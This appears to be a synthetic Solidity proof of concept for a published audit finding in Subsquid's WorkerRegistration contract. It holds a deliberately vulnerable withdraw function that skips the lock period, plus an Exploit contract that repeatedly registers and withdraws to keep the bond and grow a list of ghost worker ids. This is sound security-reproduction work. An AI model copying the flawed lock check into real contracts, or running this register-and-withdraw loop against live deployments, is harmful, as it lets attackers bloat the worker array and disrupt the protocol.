// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Subsquid — WorkerRegistration.withdraw skips the lock when deregisteredAt
    is still 0 (Pashov, finding 31548). SYNTHETIC, cheatcode-free.
    withdraw() is the audited body (@> VULN). register() sets registeredAt to
    the next epoch and pushes activeWorkerIds, matching the audited contract.
    Root cause: a not-yet-active worker has deregisteredAt == 0, so
    `block.number >= 0 + lockPeriod()` passes on any mature chain. withdraw
    returns the bond immediately and does not pop activeWorkerIds, leaving a
    ghost id. Repeating is free (the bond comes back in the same transaction),
    so the array that every worker loop walks can be grown without capital. */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WorkerRegistration {
    struct Worker {
        address creator;
        bytes peerId;
        uint256 bond;
        uint128 registeredAt;
        uint128 deregisteredAt;
    }

    MiniToken public tSQD;
    uint256 private workerIdTracker;
    mapping(uint256 => Worker) public workers;
    mapping(bytes peerId => uint256 id) public workerIds;
    uint256[] public activeWorkerIds;

    constructor(address _tSQD) {
        tSQD = MiniToken(_tSQD);
    }

    function bondAmount() public pure returns (uint256) {
        return 1000e18;
    }

    function nextEpoch() public view returns (uint128) {
        return uint128(block.number + 1000);
    }

    function lockPeriod() public pure returns (uint128) {
        return 1000;
    }

    function isWorkerActive(Worker storage worker) internal view returns (bool) {
        return worker.registeredAt > 0 && worker.registeredAt <= block.number
            && (worker.deregisteredAt == 0 || worker.deregisteredAt >= block.number);
    }

    function register(bytes calldata peerId) external {
        require(workerIds[peerId] == 0, "Worker already exists");
        workerIdTracker++;
        uint256 workerId = workerIdTracker;
        uint256 _bondAmount = bondAmount();
        workers[workerId] = Worker({
            creator: msg.sender,
            peerId: peerId,
            bond: _bondAmount,
            registeredAt: nextEpoch(),
            deregisteredAt: 0
        });
        workerIds[peerId] = workerId;
        activeWorkerIds.push(workerId);
        tSQD.transferFrom(msg.sender, address(this), _bondAmount);
    }

    function withdraw(bytes calldata peerId) external {
        uint256 workerId = workerIds[peerId];
        require(workerId != 0, "Worker not registered");
        Worker storage worker = workers[workerId];
        require(!isWorkerActive(worker), "Worker is active");
        require(worker.creator == msg.sender, "Not worker creator");
        // @> VULN: deregisteredAt == 0, so this is `block.number >= lockPeriod()` and passes.
        require(block.number >= worker.deregisteredAt + lockPeriod(), "Worker is locked");
        uint256 bond = worker.bond;
        delete workers[workerId];
        tSQD.transfer(msg.sender, bond);
    }

    function activeWorkerCount() external view returns (uint256) {
        return activeWorkerIds.length;
    }
}

contract Exploit {
    uint256 public constant BOND = 1000e18;
    MiniToken public tSQD; // nonce 1
    WorkerRegistration public reg; // nonce 2

    constructor() {
        tSQD = new MiniToken("Subsquid", "SQD");
        reg = new WorkerRegistration(address(tSQD));
        tSQD.mint(address(this), BOND);
    }

    function run() external {
        tSQD.approve(address(reg), type(uint256).max);
        reg.register(bytes("worker-1"));
        reg.withdraw(bytes("worker-1"));
        reg.register(bytes("worker-2"));
        reg.withdraw(bytes("worker-2"));
        require(tSQD.balanceOf(address(this)) == BOND, "bond not returned");
        require(tSQD.balanceOf(address(reg)) == 0, "bond still locked");
        require(reg.activeWorkerCount() == 2, "ghost ids missing");
        require(reg.workerIds(bytes("worker-1")) != 0, "peer wiped");
    }
}
